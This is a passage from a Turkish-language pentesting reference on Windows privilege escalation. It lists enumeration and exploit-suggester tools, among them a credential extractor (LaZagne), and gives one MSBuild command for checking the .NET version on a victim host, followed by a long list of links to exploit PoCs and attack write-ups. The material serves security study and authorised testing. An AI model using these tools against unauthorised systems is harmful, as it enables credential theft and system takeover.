[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Pek çok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışmak için accesschk gerektirmez, ancak kullanabilir).

**Yerel**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - başvuru notu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni gözde (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Eksiksiz OSCP Kılavuzu](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Kılavuzu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA makro phishing'i → hMailServer kimlik bilgilerinin şifresini çözme → SYSTEM'e yükselmek için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Sembolik Bağlantı Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı. Windows'ta Sembolik Bağlantıların Kötüye Kullanılması](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Modül Çözümlemesi](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi görevleri, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikili dosyalarını ele geçirme](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitifi](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silmelerinden Yararlanarak Yetki Yükseltme ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da Yerel Yetki Yükseltme için 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Kaynak Tabanlı Kısıtlı Delegasyonu: Bir Görsel Değişikliği Yetki Yükseltmeye Yol Açtığında](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünün Silinmesiyle Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
